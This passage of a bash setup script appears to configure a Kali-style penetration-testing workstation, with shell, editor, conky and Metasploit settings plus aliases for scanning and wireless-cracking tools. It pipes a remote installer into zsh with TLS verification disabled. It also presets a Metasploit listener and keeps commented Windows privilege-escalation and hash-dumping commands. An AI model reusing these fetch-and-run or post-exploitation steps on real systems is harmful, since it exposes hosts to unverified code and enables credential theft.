grep -q '^## Extract file' "${file}" 2>/dev/null || echo -e '## Extract file, example. "ex package.tar.bz2"\nex() {\n  if [[ -f $1 ]]; then\n    case $1 in\n      *.tar.bz2)   tar xjf $1  ;;\n      *.tar.gz)  tar xzf $1  ;;\n      *.bz2)     bunzip2 $1  ;;\n      *.rar)     rar x $1  ;;\n      *.gz)    gunzip $1   ;;\n      *.tar)     tar xf $1   ;;\n      *.tbz2)    tar xjf $1  ;;\n      *.tgz)     tar xzf $1  ;;\n      *.zip)     unzip $1  ;;\n      *.Z)     uncompress $1  ;;\n      *.7z)    7z x $1   ;;\n      *)       echo $1 cannot be extracted ;;\n    esac\n  else\n    echo $1 is not a valid file\n  fi\n}\n' >> "${file}"
grep -q '^## strings' "${file}" 2>/dev/null || echo -e '## strings\nalias strings="strings -a"\n' >> "${file}"
grep -q '^## history' "${file}" 2>/dev/null || echo -e '## history\nalias hg="history | grep"\n' >> "${file}"
grep -q '^## Add more aliases' "${file}" 2>/dev/null || echo -e '## Add more aliases\nalias upd="sudo apt update"\nalias upg="sudo apt upgrade"\nalias ins="sudo apt install"\nalias rem="sudo apt purge"\nalias fix="sudo apt install -f"\n' >> "${file}"
#alias ll="ls -l --block-size=\'1 --color=auto"
#--- Add in tools
grep -q '^## nmap' "${file}" 2>/dev/null || echo -e '## nmap\nalias nmap="nmap --reason --open"\n' >> "${file}"
grep -q '^## aircrack-ng' "${file}" 2>/dev/null || echo -e '## aircrack-ng\nalias aircrack-ng="aircrack-ng -z"\n' >> "${file}"
grep -q '^## airodump-ng' "${file}" 2>/dev/null || echo -e '## airodump-ng \nalias airodump-ng="airodump-ng --manufacturer --wps --uptime"\n' >> "${file}"    # aircrack-ng 1.2 rc2
grep -q '^## metasploit' "${file}" 2>/dev/null || echo -e '## metasploit\nalias msfc="systemctl start postgresql; msfdb start; msfconsole -q \"$@\""\nalias msfconsole="systemctl start postgresql; msfdb start; msfconsole \"$@\""\n' >> "${file}"
[ "${openVAS}" != "false" ] && grep -q '^## openvas' "${file}" 2>/dev/null || echo -e '## openvas\nalias openvas="openvas-stop; openvas-start; sleep 3s; xdg-open https://127.0.0.1:9392/ >/dev/null 2>&1"\n' >> "${file}"
grep -q '^## ssh' "${file}" 2>/dev/null || echo -e '## ssh\nalias ssh-start="systemctl restart ssh"\nalias ssh-stop="systemctl stop ssh"\n' >> "${file}"

#--- Add in folders
grep -q '^## www' "${file}" 2>/dev/null || echo -e '## www\nalias wwwroot="cd /var/www/html/"\n#alias www="cd /var/www/html/"\n' >> "${file}"       # systemctl apache2 start
grep -q '^## ftp' "${file}" 2>/dev/null || echo -e '## ftp\nalias ftproot="cd /var/ftp/"\n' >> "${file}"                                            # systemctl pure-ftpd start
grep -q '^## tftp' "${file}" 2>/dev/null || echo -e '## tftp\nalias tftproot="cd /var/tftp/"\n' >> "${file}"                                        # systemctl atftpd start
grep -q '^## smb' "${file}" 2>/dev/null || echo -e '## smb\nalias sambaroot="cd /var/samba/"\n#alias smbroot="cd /var/samba/"\n' >> "${file}"       # systemctl samba start
(dmidecode | grep -iq vmware) && (grep -q '^## vmware' "${file}" 2>/dev/null || echo -e '## vmware\nalias vmroot="cd /mnt/hgfs/"\n' >> "${file}")
grep -q '^## edb' "${file}" 2>/dev/null || echo -e '## edb\nalias edb="cd /usr/share/exploitdb/platforms/"\nalias edbroot="cd /usr/share/exploitdb/platforms/"\n' >> "${file}"
grep -q '^## wordlist' "${file}" 2>/dev/null || echo -e '## wordlist\nalias wordlist="cd /usr/share/wordlists/"\nalias wordls="cd /usr/share/wordlists/"\n' >> "${file}"
#--- Apply new aliases
if [[ "${SHELL}" == "/bin/zsh" ]]; then source ~/.zshrc else source "${file}"; fi
#--- Check
#--- Check
#alias


##### Install GNOME Terminator
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing GNOME ${GREEN}Terminator${RESET} ~ multiple terminals in a single window"
apt -y -qq install terminator || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Configure terminator
mkdir -p ~/.config/terminator/
file=~/.config/terminator/config; [ -e "${file}" ] && cp -n $file{,.bkup}
[ -e "${file}" ] || cat <<EOF > "${file}"
[global_config]
  enabled_plugins = TerminalShot, LaunchpadCodeURLHandler, APTURLHandler, LaunchpadBugURLHandler
[keybindings]
[profiles]
  [[default]]
    background_darkness = 0.9
    scroll_on_output = False
    copy_on_selection = True
    background_type = transparent
    scrollback_infinite = True
    show_titlebar = False
[layouts]
  [[default]]
    [[[child1]]]
      type = Terminal
      parent = window0
    [[[window0]]]
      type = Window
      parent = ""
[plugins]
EOF
#--- XFCE fix for terminator
mkdir -p ~/.local/share/xfce4/helpers/
file=~/.local/share/xfce4/helpers/custom-TerminalEmulator.desktop; [ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's#^X-XFCE-CommandsWithParameter=.*#X-XFCE-CommandsWithParameter=/usr/bin/terminator --command="%s"#' "${file}" 2>/dev/null || cat <<EOF > "${file}"
[Desktop Entry]
NoDisplay=true
Version=1.0
Encoding=UTF-8
Type=X-XFCE-Helper
X-XFCE-Category=TerminalEmulator
X-XFCE-CommandsWithParameter=/usr/bin/terminator --command="%s"
Icon=terminator
Name=terminator
X-XFCE-Commands=/usr/bin/terminator
EOF
#--- Set terminator for XFCE's default
mkdir -p ~/.config/xfce4/
file=~/.config/xfce4/helpers.rc; [ -e "${file}" ] && cp -n $file{,.bkup}    #exo-preferred-applications   #xdg-mime default
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
sed -i 's_^TerminalEmulator=.*_TerminalEmulator=debian-x-terminal-emulator_' "${file}" 2>/dev/null \
  || echo -e 'TerminalEmulator=debian-x-terminal-emulator' >> "${file}"

##### Install ZSH & Oh-My-ZSH - root user.   Note:  'Open terminal here', will not work with ZSH.   Make sure to have tmux already installed
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}ZSH${RESET} & ${GREEN}Oh-My-ZSH${RESET} ~ unix shell"
#group="sudo"
apt -y -qq install zsh git curl || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Setup oh-my-zsh
#rm -rf ~/.oh-my-zsh/
timeout 300 curl  -k -L -f "https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh" | zsh    #curl -s -L "https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh"  || echo -e ' '${RED}'[!]'${RESET}" Issue downloading file" 1>&2
#--- Configure zsh
file=~/.zshrc; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/zsh/zshrc
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q 'interactivecomments' "${file}" 2>/dev/null || echo 'setopt interactivecomments' >> "${file}"
grep -q 'ignoreeof' "${file}" 2>/dev/null || echo 'setopt ignoreeof' >> "${file}"
grep -q 'correctall' "${file}" 2>/dev/null || echo 'setopt correctall' >> "${file}"
grep -q 'globdots' "${file}" 2>/dev/null || echo 'setopt globdots' >> "${file}"
grep -q 'auto_cd' "${file}" 2>/dev/null || echo 'setopt auto_cd' >> "${file}"
grep -q '.bash_aliases' "${file}" 2>/dev/null || echo 'source $HOME/.bash_aliases' >> "${file}"
grep -q '/usr/bin/tmux' "${file}" 2>/dev/null || echo '#if ([[ -z "$TMUX" && -n "$SSH_CONNECTION" ]]); then /usr/bin/tmux attach || /usr/bin/tmux new; fi' >> "${file}"   # If not already in tmux and via SSH
#--- Configure zsh (themes) ~ https://github.com/robbyrussell/oh-my-zsh/wiki/Themes
sed -i 's/ZSH_THEME=.*/ZSH_THEME="random"/' "${file}"   # Other themes: mh, jreese,   alanpeabody,   candy,   terminalparty, kardan,   nicoulaj, sunaku
#--- Configure oh-my-zsh
sed -i 's/.*DISABLE_AUTO_UPDATE="true"/DISABLE_AUTO_UPDATE="true"/' "${file}"
sed -i 's/plugins=(.*)/plugins=(git tmux last-working-dir)/' "${file}"
#--- Set zsh as default shell (current user)
chsh -s "$(which zsh)"


##### Install tmux - all users
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL})Installing ${GREEN}tmux${RESET} ~ multiplex virtual consoles"
#group="sudo"
#apt -y -qq remove screen   # Optional: If we're going to have/use tmux, why have screen?
apt -y -qq install tmux || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Configure tmux
file=~/.tmux.conf; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/tmux.conf
[ -e "${file}" ] || cat <<EOF > "${file}"
#-Settings---------------------------------------------------------------------
## Make it like screen (use CTRL+a)
unbind C-b
set -g prefix C-a
## Pane switching (SHIFT+ARROWS)
bind-key -n S-Left select-pane -L
bind-key -n S-Right select-pane -R
bind-key -n S-Up select-pane -U
bind-key -n S-Down select-pane -D
## Windows switching (ALT+ARROWS)
bind-key -n M-Left  previous-window
bind-key -n M-Right next-window
## Windows re-ording (SHIFT+ALT+ARROWS)
bind-key -n M-S-Left swap-window -t -1
bind-key -n M-S-Right swap-window -t +1
## Activity Monitoring
setw -g monitor-activity on
set -g visual-activity on
## Set defaults
set -g default-terminal screen-256color
set -g history-limit 5000
## Default windows titles
set -g set-titles on
set -g set-titles-string '#(whoami)@#H - #I:#W'
## Last window switch
bind-key C-a last-window
## Reload settings (CTRL+a -> r)
unbind r
bind r source-file /etc/tmux.conf
## Load custom sources
#source ~/.bashrc   #(issues if you use /bin/bash & Debian)
EOF
[ -e /bin/zsh ] && echo -e '## Use ZSH as default shell\nset-option -g default-shell /bin/zsh\n' >> "${file}"      # Need to have ZSH installed before running this command/line
cat <<EOF >> "${file}"
## Show tmux messages for longer
set -g display-time 3000
## Status bar is redrawn every minute
set -g status-interval 60
#-Theme------------------------------------------------------------------------
## Default colours
set -g status-bg black
set -g status-fg white
## Left hand side
set -g status-left-length '34'
set -g status-left '#[fg=green,bold]#(whoami)#[default]@#[fg=yellow,dim]#H #[fg=green,dim][#[fg=yellow]#(cut -d " " -f 1-3 /proc/loadavg)#[fg=green,dim]]'
## Inactive windows in status bar
set-window-option -g window-status-format '#[fg=red,dim]#I#[fg=grey,dim]:#[default,dim]#W#[fg=grey,dim]'
## Current or active window in status bar
#set-window-option -g window-status-current-format '#[bg=white,fg=red]#I#[bg=white,fg=grey]:#[bg=white,fg=black]#W#[fg=dim]#F'
set-window-option -g window-status-current-format '#[fg=red,bold](#[fg=white,bold]#I#[fg=red,dim]:#[fg=white,bold]#W#[fg=red,bold])'
## Right hand side
set -g status-right '#[fg=green][#[fg=yellow]%Y-%m-%d #[fg=white]%H:%M#[fg=green]]'
EOF
#--- Setup alias
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^alias tmux' "${file}" 2>/dev/null || echo -e '## tmux\nalias tmux="tmux attach || tmux new"\n' >> "${file}"    #alias tmux="tmux attach -t $HOST || tmux new -s $HOST"
#--- Apply new alias
if [[ "${SHELL}" == "/bin/zsh" ]]; then source ~/.zshrc else source "${file}"; fi
source "${file}" || source ~/.zshrc


##### Configure screen ~ if possible, use tmux instead!
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ~ multiplex virtual consoles"
#apt -y -qq install screen || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Configure screen
file=~/.screenrc; [ -e "${file}" ] && cp -n $file{,.bkup}
[ -e "${file}" ] || cat <<EOF > "${file}"
## Don't display the copyright page
startup_message off
## tab-completion flash in heading bar
vbell off
## Keep scrollback n lines
defscrollback 1000
## Hardstatus is a bar of text that is visible in all screens
hardstatus on
hardstatus alwayslastline
hardstatus string '%{gk}%{G}%H %{g}[%{Y}%l%{g}] %= %{wk}%?%-w%?%{=b kR}(%{W}%n %t%?(%u)%?%{=b kR})%{= kw}%?%+w%?%?%= %{g} %{Y} %Y-%m-%d %C%a %{W}'
## Title bar
termcapinfo xterm ti@:te@
## Default windows (syntax: screen -t label order command)
screen -t bash1 0
screen -t bash2 1
## Select the default window
select 0
EOF


##### Install vim - all users
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}vim${RESET} ~ CLI text editor"
apt -y -qq install vim || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Configure vim
file=/etc/vim/vimrc; [ -e "${file}" ] && cp -n $file{,.bkup}   #~/.vimrc
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
sed -i 's/.*syntax on/syntax on/' "${file}"
sed -i 's/.*set background=dark/set background=dark/' "${file}"
sed -i 's/.*set showcmd/set showcmd/' "${file}"
sed -i 's/.*set showmatch/set showmatch/' "${file}"
sed -i 's/.*set ignorecase/set ignorecase/' "${file}"
sed -i 's/.*set smartcase/set smartcase/' "${file}"
sed -i 's/.*set incsearch/set incsearch/' "${file}"
sed -i 's/.*set autowrite/set autowrite/' "${file}"
sed -i 's/.*set hidden/set hidden/' "${file}"
sed -i 's/.*set mouse=.*/"set mouse=a/' "${file}"
grep -q '^set number' "${file}" 2>/dev/null || echo 'set number' >> "${file}"                                                                        # Add line numbers
grep -q '^set autoindent' "${file}" 2>/dev/null || echo 'set autoindent' >> "${file}"                                                                # Set auto indent
grep -q '^set expandtab' "${file}" 2>/dev/null || echo -e 'set expandtab\nset smarttab' >> "${file}"                                                 # Set use spaces instead of tabs
grep -q '^set softtabstop' "${file}" 2>/dev/null || echo -e 'set softtabstop=4\nset shiftwidth=4' >> "${file}"                                       # Set 4 spaces as a 'tab'
grep -q '^set foldmethod=marker' "${file}" 2>/dev/null || echo 'set foldmethod=marker' >> "${file}"                                                  # Folding
grep -q '^nnoremap <space> za' "${file}" 2>/dev/null || echo 'nnoremap <space> za' >> "${file}"                                                      # Space toggle folds
grep -q '^set hlsearch' "${file}" 2>/dev/null || echo 'set hlsearch' >> "${file}"                                                                    # Highlight search results
grep -q '^set laststatus' "${file}" 2>/dev/null || echo -e 'set laststatus=2\nset statusline=%F%m%r%h%w\ (%{&ff}){%Y}\ [%l,%v][%p%%]' >> "${file}"   # Status bar
grep -q '^filetype on' "${file}" 2>/dev/null || echo -e 'filetype on\nfiletype plugin on\nsyntax enable\nset grepprg=grep\ -nH\ $*' >> "${file}"     # Syntax highlighting
grep -q '^set wildmenu' "${file}" 2>/dev/null || echo -e 'set wildmenu\nset wildmode=list:longest,full' >> "${file}"                                 # Tab completion
grep -q '^set invnumber' "${file}" 2>/dev/null || echo -e ':nmap <F8> :set invnumber<CR>' >> "${file}"                                               # Toggle line numbers
grep -q '^set pastetoggle=<F9>' "${file}" 2>/dev/null || echo -e 'set pastetoggle=<F9>' >> "${file}"                                                 # Hotkey - turning off auto indent when pasting
grep -q '^:command Q q' "${file}" 2>/dev/null || echo -e ':command Q q' >> "${file}"                                                                 # Fix stupid typo I always make
#--- Set as default editor
export EDITOR="vim"   #update-alternatives --config editor
file=/etc/bash.bashrc; [ -e "${file}" ] && cp -n $file{,.bkup}
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
grep -q '^EDITOR' "${file}" 2>/dev/null || echo 'EDITOR="vim"' >> "${file}"
git config --global core.editor "vim"
#--- Set as default mergetool
git config --global merge.tool vimdiff
git config --global merge.conflictstyle diff3
git config --global mergetool.prompt false




##### Install conky
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}conky${RESET} ~ GUI desktop monitor"
apt -y -qq install conky || echo -e ' '${RED}'[!] Issue with apt'${RESET} 1>&2
#--- Configure conky
file=~/.conkyrc; [ -e "${file}" ] && cp -n $file{,.bkup}
[ -e "${file}" ] || cat <<EOF > "${file}"
]]

conky.config = {

  --Various settings

  background = true,              -- forked to background
  cpu_avg_samples = 2,            -- The number of samples to average for CPU monitoring.
  diskio_avg_samples = 10,          -- The number of samples to average for disk I/O monitoring.
  double_buffer = true,           -- Use the Xdbe extension? (eliminates flicker)
  if_up_strictness = 'address',       -- how strict if testing interface is up - up, link or address
  net_avg_samples = 2,            -- The number of samples to average for net data
  no_buffers = true,              -- Subtract (file system) buffers from used memory?
  temperature_unit = 'celsius',       -- fahrenheit or celsius
  text_buffer_size = 2048,          -- size of buffer for display of content of large variables - default 256
  update_interval = 1,            -- update interval
  imlib_cache_size = 0,                       -- disable image cache to get a new spotify cover per song


  --Placement

  alignment = 'bottom_right',          -- top_left,top_middle,top_right,bottom_left,bottom_middle,bottom_right,
                        -- middle_left,middle_middle,middle_right,none

  --gap_x = -1910,
  gap_x = 5,                 -- pixels between right or left border
  gap_y = 0,                  -- pixels between bottom or left border
  minimum_height = 600,           -- minimum height of window
  minimum_width = 260,            -- minimum width of window
  maximum_width = 475,            -- maximum width of window

  --Graphical

  border_inner_margin = 10,           -- margin between border and text
  border_outer_margin = 5,          -- margin between border and edge of window
  border_width = 0,               -- border width in pixels
  default_bar_width = 80,             -- default is 0 - full width
  default_bar_height = 10,          -- default is 6
  default_gauge_height = 25,          -- default is 25
  default_gauge_width =40,          -- default is 40
  default_graph_height = 40,          -- default is 25
  default_graph_width = 0,          -- default is 0 - full width
  default_shade_color = '#000000',      -- default shading colour
  default_outline_color = '#000000',      -- default outline colour
  draw_borders = false,           -- draw borders around text
  draw_graph_borders = true,          -- draw borders around graphs
  draw_shades = false,            -- draw shades
  draw_outline = false,           -- draw outline
  stippled_borders = 0,           -- dashing the border

  --Textual

  extra_newline = false,            -- extra newline at the end - for asesome's wiboxes
  format_human_readable = true,       -- KiB, MiB rather then number of bytes
  font = 'Roboto Mono:size=10',         -- font for complete conky unless in code defined
  max_text_width = 0,             -- 0 will make sure line does not get broken if width too smal
  max_user_text = 16384,            -- max text in conky default 16384
  override_utf8_locale = true,        -- force UTF8 requires xft
  short_units = true,             -- shorten units from KiB to k
  top_name_width = 21,            -- width for $top name value default 15
  top_name_verbose = false,         -- If true, top name shows the full command line of  each  process - Default value is false.
  uppercase = false,              -- uppercase or not
  use_spacer = 'none',            -- adds spaces around certain objects to align - default none
  use_xft = true,               -- xft font - anti-aliased font
  xftalpha = 1,               -- alpha of the xft font - between 0-1

  --Windows

  own_window = true,              -- create your own window to draw
  own_window_argb_value = 100,          -- real transparency - composite manager required 0-255
  own_window_argb_visual = true,        -- use ARGB - composite manager required
  own_window_colour = '#000000',        -- set colour if own_window_transparent no
  own_window_hints = 'undecorated,below,sticky,skip_taskbar,skip_pager',  -- if own_window true - just hints - own_window_type sets it
  own_window_transparent = false,       -- if own_window_argb_visual is true sets background opacity 0%
  own_window_title = 'system_conky',      -- set the name manually  - default conky "hostname"
  own_window_type = 'normal',       -- if own_window true options are: normal/override/dock/desktop/panel


  --Colours

  default_color = '#D9DDE2',          -- default color and border color
  color1 = '#FF0000',
  color2 = '#3e5570',
  color3 = '#cccccc',
  color4 = '#D9BC83',
  color5 = '#00BFFF',                         --teal
  color6 = '#FFFFFF',                         --white

  --Signal Colours
  color7 = '#C0FF00',             --green
  color8 = '#FFA726',             --orange
  color9 = '#F1544B',             --firebrick

    --Lua
};

conky.text = [[
\${color dodgerblue3}SYSTEM \${hr 2}\$color
\#${color white}\${time %A},\${time %e} \${time %B} \${time %G}\${alignr}\${time %H:%M:%S}
\${color white}Host\$color: \$nodename  \${alignr}\${color white}Uptime\$color: \$uptime
\${color dodgerblue3}CPU \${hr 2}\$color
\#${font Arial:bold:size=8}\${execi 99999 grep "model name" -m1 /proc/cpuinfo | cut -d":" -f2 | cut -d" " -f2- | sed "s#Processor ##"}\$font\$color
\${color white}MHz\$color: \${freq} \${alignr}\${color white}Load\$color: \${exec uptime | awk -F "load average: "  '{print \$2}'}
\${color white}Tasks\$color: \$running_processes/\$processes \${alignr}\${color white}CPU0\$color: \${cpu cpu0}% \${color white}CPU1\$color: \${cpu cpu1}%
\#${color #c0ff3e}\${acpitemp}C
\#${execi 20 sensors |grep "Core0 Temp" | cut -d" " -f4}\$font$color\${alignr}\${freq_g 2} \${execi 20 sensors |grep "Core1 Temp" | cut -d" " -f4}
\${cpugraph cpu0 25,120 000000 white} \${alignr}\${cpugraph cpu1 25,120 000000 white}
\${color white}\${cpubar cpu1 3,120} \${alignr}\${color white}\${cpubar cpu2 3,120}\$color
\${color dodgerblue3}PROCESSES \${hr 2}\$color
\${color white}NAME             PID     CPU     MEM
\${color white}\${top name 1}\${top pid 1}  \${top cpu 1}  \${top mem 1}\$color
\${top name 2}\${top pid 2}  \${top cpu 2}  \${top mem 2}
\${top name 3}\${top pid 3}  \${top cpu 3}  \${top mem 3}
\${top name 4}\${top pid 4}  \${top cpu 4}  \${top mem 4}
\${top name 5}\${top pid 5}  \${top cpu 5}  \${top mem 5}
\${color dodgerblue3}MEMORY & SWAP \${hr 2}\$color
\${color white}RAM\$color  \$alignr\$memperc%  \${membar 6,170}\$color
\${color white}Swap\$color  \$alignr\$swapperc%  \${swapbar 6,170}\$color
\${color dodgerblue3}FILESYSTEM \${hr 2}\$color
\${color white}root\$color \${fs_free_perc /}% free\${alignr}\${fs_free /}/ \${fs_size /}
\${fs_bar 3 /}\$color
\#\${color white}home\$color \${fs_free_perc /home}% free\${alignr}\${fs_free /home}/ \${fs_size /home}
\#\${fs_bar 3 /home}\$color
\${color dodgerblue3}Host IP (\${addr eth0}) \${hr 2}\$color
\${color white}Down\$color:  \${downspeed eth0} KB/s\${alignr}\${color white}Up\$color: \${upspeed eth0} KB/s
\${color white}Downloaded\$color: \${totaldown eth0} \${alignr}\${color white}Uploaded\$color: \${totalup eth0}
\${downspeedgraph eth0 25,120 000000 00ff00} \${alignr}\${upspeedgraph eth0 25,120 000000 ff0000}\$color
\${color dodgerblue3}VPN IP(\${addr tun0}) \${hr 2}\$color
\${color white}Down\$color:  \${downspeed tun0} KB/s\${alignr}\${color white}Up\$color: \${upspeed tun0} KB/s
\${color white}Downloaded\$color: \${totaldown tun0} \${alignr}\${color white}Uploaded\$color: \${totalup tun0}
\${downspeedgraph tun0 25,120 000000 00ff00} \${alignr}\${upspeedgraph tun0 25,120 000000 ff0000}\$color

\${color dodgerblue3}CONNECTIONS \${hr 2}\$color
\${color white}Inbound: \$color\${tcp_portmon 1 32767 count}
\${alignc}\${color white}Outbound: \$color\${tcp_portmon 32768 61000 count}\${alignr}\${color white}Total: \$color\${tcp_portmon 1 65535 count}
\${color white}Inbound \${alignr}Local Service/Port\$color
\$color \${tcp_portmon 1 32767 rhost 0} \${alignr}\${tcp_portmon 1 32767 lservice 0}
\$color \${tcp_portmon 1 32767 rhost 1} \${alignr}\${tcp_portmon 1 32767 lservice 1}
\$color \${tcp_portmon 1 32767 rhost 2} \${alignr}\${tcp_portmon 1 32767 lservice 2}
\${color white}Outbound \${alignr}Remote Service/Port\$color
\$color \${tcp_portmon 32768 61000 rhost 0} \${alignr}\${tcp_portmon 32768 61000 rservice 0}
\$color \${tcp_portmon 32768 61000 rhost 1} \${alignr}\${tcp_portmon 32768 61000 rservice 1}
\$color \${tcp_portmon 32768 61000 rhost 2} \${alignr}\${tcp_portmon 32768 61000 rservice 2}
]];
EOF
#--- Add to startup (each login)
file=/usr/local/bin/start-conky; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
#!/bin/bash
[[ -z ${DISPLAY} ]] && export DISPLAY=:0.0
$(which timeout) 10 $(which killall) -q conky
$(which sleep) 15s
$(which conky) &
EOF
chmod -f 0500 "${file}"
mkdir -p ~/.config/autostart/
file=~/.config/autostart/conkyscript.desktop; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > "${file}" || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
[Desktop Entry]
Name=conky
Exec=/usr/local/bin/start-conky
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Type=Application
Comment=
EOF
#--- Add keyboard shortcut (CTRL+r) to run the conky refresh script
file=~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml   #; [ -e "${file}" ] && cp -n $file{,.bkup}
if [ -e "${file}" ]; then
  grep -q '<property name="&lt;Primary&gt;r" type="string" value="/usr/local/bin/start-conky"/>' "${file}" \
    || sed -i 's#<property name="\&lt;Alt\&gt;F2" type="string" value="xfrun4"/>#<property name="\&lt;Alt\&gt;F2" type="string" value="xfrun4"/>\n      <property name="\&lt;Primary\&gt;r" type="string" value="/usr/local/bin/start-conky"/>#' "${file}"
fi


##### Install metasploit
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Installing ${GREEN}metasploit${RESET} ~ exploit framework"
apt -y -qq install metasploit-framework \
  || echo -e ' '${RED}'[!] Issue with apt install'${RESET} 1>&2
mkdir -p ~/.msf4/modules/{auxiliary,exploits,payloads,post}/
#--- Fix any port issues
file=$(find /etc/postgresql/*/main/ -maxdepth 1 -type f -name postgresql.conf -print -quit);
[ -e "${file}" ] && cp -n $file{,.bkup}
sed -i 's/port = .* #/port = 5432 /' "${file}"
#--- Fix permissions - 'could not translate host name "localhost", service "5432" to address: Name or service not known'
chmod 0644 /etc/hosts
#--- Start services
systemctl stop postgresql
systemctl start postgresql
msfdb reinit
sleep 5s
#--- Autorun Metasploit commands each startup
file=~/.msf4/msf_autorunscript.rc; [ -e "${file}" ] && cp -n $file{,.bkup}
if [[ -f "${file}" ]]; then
  echo -e ' '${RED}'[!]'${RESET}" ${file} detected. Skipping..." 1>&2
else
  cat <<EOF > "${file}"
#run post/windows/escalate/getsystem
#run migrate -f -k
#run migrate -n "explorer.exe" -k    # Can trigger AV alerts by touching explorer.exe...
#run post/windows/manage/smart_migrate
#run post/windows/gather/smart_hashdump
EOF
fi
file=~/.msf4/msfconsole.rc; [ -e "${file}" ] && cp -n $file{,.bkup}
if [[ -f "${file}" ]]; then
  echo -e ' '${RED}'[!]'${RESET}" ${file} detected. Skipping..." 1>&2
else
  cat <<EOF > "${file}"
load auto_add_route
load alias
alias del rm
alias handler use exploit/multi/handler
load sounds
setg TimestampOutput true
setg VERBOSE true
setg ExitOnSession false
setg EnableStageEncoding true
setg LHOST 0.0.0.0
setg LPORT 443
EOF
#use exploit/multi/handler
#setg AutoRunScript 'multi_console_command -rc "~/.msf4/msf_autorunscript.rc"'
#set PAYLOAD windows/meterpreter/reverse_https
fi
#--- Aliases time
file=~/.bash_aliases; [ -e "${file}" ] && cp -n $file{,.bkup}   #/etc/bash.bash_aliases
([[ -e "${file}" && "$(tail -c 1 ${file})" != "" ]]) && echo >> "${file}"
#--- Aliases for console
grep -q '^alias msfc=' "${file}" 2>/dev/null \
  || echo -e 'alias msfc="systemctl start postgresql; msfdb start; msfconsole -q \"\$@\""' >> "${file}"
grep -q '^alias msfconsole=' "${file}" 2>/dev/null \
  || echo -e 'alias msfconsole="systemctl start postgresql; msfdb start; msfconsole \"\$@\""\n' >> "${file}"
#--- Aliases to speed up msfvenom (create static output)
grep -q "^alias msfvenom-list-all" "${file}" 2>/dev/null \
  || echo "alias msfvenom-list-all='cat ~/.msf4/msfvenom/all'" >> "${file}"
grep -q "^alias msfvenom-list-nops" "${file}" 2>/dev/null \
  || echo "alias msfvenom-list-nops='cat ~/.msf4/msfvenom/nops'" >> "${file}"
grep -q "^alias msfvenom-list-payloads" "${file}" 2>/dev/null \
  || echo "alias msfvenom-list-payloads='cat ~/.msf4/msfvenom/payloads'" >> "${file}"
grep -q "^alias msfvenom-list-encoders" "${file}" 2>/dev/null \
  || echo "alias msfvenom-list-encoders='cat ~/.msf4/msfvenom/encoders'" >> "${file}"
grep -q "^alias msfvenom-list-formats" "${file}" 2>/dev/null \
  || echo "alias msfvenom-list-formats='cat ~/.msf4/msfvenom/formats'" >> "${file}"
grep -q "^alias msfvenom-list-generate" "${file}" 2>/dev/null \
  || echo "alias msfvenom-list-generate='_msfvenom-list-generate'" >> "${file}"
grep -q "^function _msfvenom-list-generate" "${file}" 2>/dev/null \
  || cat <<EOF >> "${file}" \
    || echo -e ' '${RED}'[!] Issue with writing file'${RESET} 1>&2
function _msfvenom-list-generate {
  mkdir -p ~/.msf4/msfvenom/
  msfvenom --list > ~/.msf4/msfvenom/all
  msfvenom --list nops > ~/.msf4/msfvenom/nops
  msfvenom --list payloads > ~/.msf4/msfvenom/payloads
  msfvenom --list encoders > ~/.msf4/msfvenom/encoders
  msfvenom --help-formats 2> ~/.msf4/msfvenom/formats
}
EOF
#--- Apply new aliases
source "${file}" || source ~/.zshrc
#--- Generate (Can't call alias)
mkdir -p ~/.msf4/msfvenom/
msfvenom --list > ~/.msf4/msfvenom/all
msfvenom --list nops > ~/.msf4/msfvenom/nops
msfvenom --list payloads > ~/.msf4/msfvenom/payloads
msfvenom --list encoders > ~/.msf4/msfvenom/encoders
msfvenom --help-formats 2> ~/.msf4/msfvenom/formats
#--- First time run with Metasploit
(( STAGE++ )); echo -e " ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) ${GREEN}Starting Metasploit for the first time${RESET} ~ this ${BOLD}will take a ~350 seconds${RESET} (~6 mintues)"
echo "Started at: $(date)"
systemctl start postgresql
msfdb start
msfconsole -q -x 'version;db_status;sleep 310;exit'


##### Configuring armitage
(( STAGE++ )); echo -e "\n\n ${GREEN}[+]${RESET} (${STAGE}/${TOTAL}) Configuring ${GREEN}armitage${RESET} ~ GUI Metasploit UI"
export MSF_DATABASE_CONFIG=/usr/share/metasploit-framework/config/database.yml
